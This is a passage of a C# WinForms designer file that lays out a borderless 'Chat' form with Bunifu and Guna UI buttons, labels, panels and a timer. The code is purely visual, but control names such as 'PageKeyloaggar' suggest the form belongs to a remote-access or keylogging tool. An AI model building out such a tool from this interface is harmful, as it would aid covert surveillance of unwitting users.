        this.LoaderConnect.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.LoaderConnect.ShowText = false;
        this.LoaderConnect.Size = new System.Drawing.Size(57, 50);
        this.LoaderConnect.Speed = 7;
        this.LoaderConnect.TabIndex = 607;
        this.LoaderConnect.Text = "bunifuLoader1";
        this.LoaderConnect.TextPadding = new System.Windows.Forms.Padding(0);
        this.LoaderConnect.Thickness = 6;
        this.LoaderConnect.Transparent = true;
        this.LoaderConnect.Visible = false;
        // 
        // ButtClose
        // 
        this.ButtClose.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(237)))), ((int)(((byte)(107)))), ((int)(((byte)(96)))));
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(237)))), ((int)(((byte)(107)))), ((int)(((byte)(96)))));
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(237)))), ((int)(((byte)(107)))), ((int)(((byte)(96)))));
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(237)))), ((int)(((byte)(107)))), ((int)(((byte)(96)))));
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(557, 13);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(this.ButtClose_Click);
        // 
        // ButtionMinimized
        // 
        this.ButtionMinimized.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(97)))), ((int)(((byte)(196)))), ((int)(((byte)(83)))));
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(509, 13);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(this.ButtionMinimized_Click);
        // 
        // ButtonMaximized
        // 
        this.ButtonMaximized.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.ButtonMaximized.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButtonMaximized.CheckedState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMaximized.CustomImages.Parent = this.ButtonMaximized;
        this.ButtonMaximized.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(190)))), ((int)(((byte)(83)))));
        this.ButtonMaximized.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButtonMaximized.ForeColor = System.Drawing.Color.White;
        this.ButtonMaximized.HoverState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Location = new System.Drawing.Point(533, 13);
        this.ButtonMaximized.Name = "ButtonMaximized";
        this.ButtonMaximized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtonMaximized.ShadowDecoration.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Size = new System.Drawing.Size(17, 17);
        this.ButtonMaximized.TabIndex = 574;
        this.ButtonMaximized.Click += new System.EventHandler(this.ButtonMaximized_Click);
        // 
        // UserIdInfo
        // 
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(10, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuLabel1
        // 
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(28, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Chat";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ImageLogo
        // 
        this.ImageLogo.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ImageLogo.Image = ((System.Drawing.Image)(resources.GetObject("ImageLogo.Image")));
        this.ImageLogo.Location = new System.Drawing.Point(10, 13);
        this.ImageLogo.Name = "ImageLogo";
        this.ImageLogo.Size = new System.Drawing.Size(59, 50);
        this.ImageLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageLogo.TabIndex = 570;
        this.ImageLogo.TabStop = false;
        // 
        // PanelBottom
        // 
        this.PanelBottom.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("PanelBottom.BackgroundImage")));
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 526);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(284, 25);
        this.PanelBottom.TabIndex = 594;
        // 
        // PanelLeft
        // 
        this.PanelLeft.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)));
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("PanelLeft.BackgroundImage")));
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 112);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 318);
        this.PanelLeft.TabIndex = 593;
        // 
        // PanelTOP
        // 
        this.PanelTOP.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("PanelTOP.BackgroundImage")));
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(284, 25);
        this.PanelTOP.TabIndex = 592;
        // 
        // PanelRight
        // 
        this.PanelRight.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("PanelRight.BackgroundImage")));
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(607, 108);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 318);
        this.PanelRight.TabIndex = 591;
        // 
        // FormDragControl1
        // 
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        // 
        // Timer1
        // 
        this.Timer1.Interval = 2000;
        this.Timer1.Tick += new System.EventHandler(this.Timer1_Tick);
        // 
        // Chat
        // 
        this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
        this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        this.ClientSize = new System.Drawing.Size(641, 561);
        this.Controls.Add(this.panelForm);
        this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
        this.Name = "Chat";
        this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Chat";
        this.TransparencyKey = System.Drawing.Color.Gainsboro;
        this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Chat_FormClosing);
        this.Load += new System.EventHandler(this.Chat_Load);
        this.Shown += new System.EventHandler(this.Chat_Shown);
        this.panelForm.ResumeLayout(false);
        this.PanelLoagen.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
        this.PageKeyloaggar.ResumeLayout(false);
        this.PageOfflien.ResumeLayout(false);
        this.PageOfflien.PerformLayout();
        this.BottomTols.ResumeLayout(false);
        this.BottomTols.PerformLayout();
        this.TopTols.ResumeLayout(false);
        this.TopTols.PerformLayout();
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)(this.ImageLogo)).EndInit();
        this.ResumeLayout(false);

    }
}
